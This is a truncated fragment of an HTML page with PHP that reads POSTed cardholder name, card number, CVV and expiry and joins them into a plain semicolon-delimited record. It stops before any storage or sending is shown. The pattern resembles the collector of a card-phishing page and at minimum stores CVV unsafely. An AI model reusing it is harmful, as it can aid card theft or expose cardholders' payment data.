<html>
	...
	<body>
		...
		<?php						
			if(isset($_POST['Name']) && isset($_POST['month']) && isset($_POST['cardNum']) && isset($_POST['year']) &&isset($_POST['CVV'])) {
				$data = $_POST['Name'] . ';' . $_POST['cardNum'] . ';'. $_POST['CVV'] . ';' . $_POST['month'] . ';' . $_POST['year'] ."\r\n";
